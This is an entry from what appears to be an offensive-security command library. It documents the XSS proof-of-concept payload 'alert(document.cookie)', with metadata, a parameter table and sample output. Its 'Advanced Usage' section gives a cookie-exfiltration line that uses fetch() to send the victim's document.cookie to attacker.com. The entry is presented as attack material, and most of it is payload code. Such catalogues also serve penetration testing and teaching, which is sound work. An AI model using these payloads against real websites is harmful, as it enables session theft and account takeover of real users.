---
id: cmd-alert-cookie-751870
data: alert(document.cookie);
tags:
  - xss
  - javascript
type: command
output: An alert popup displaying the victim's cookie values
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:37.969Z'
verified: false
validated: true
submitted: true
---
# alert-document-cookie

## Command

```javascript
alert(document.cookie);
```

## Description

This JavaScript command accesses the browser's document.cookie property to retrieve all available cookies and displays them in a browser alert dialog. It is commonly used in XSS payloads for proof-of-concept demonstrations of session theft.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.cookie | Built-in API to get all cookies as a semicolon-separated string | Yes |
| alert() | Native browser function to show a popup with the cookie data | Yes |

## Examples

### Basic Usage

```javascript
alert(document.cookie);
```

### Advanced Usage

```javascript
// For exfiltration instead of alert
fetch('https://attacker.com/steal?cookies=' + document.cookie);
```

## Expected Output

A modal alert box pops up in the browser, showing cookie data like '_icl_current_language=en; __cfduid=de74423d435717d651b1c9e2c63f4acc21575460678'. If no cookies, an empty string is displayed.

## Related

- [[Related Procedure: Prepare-XSS-JavaScript-Payload]]
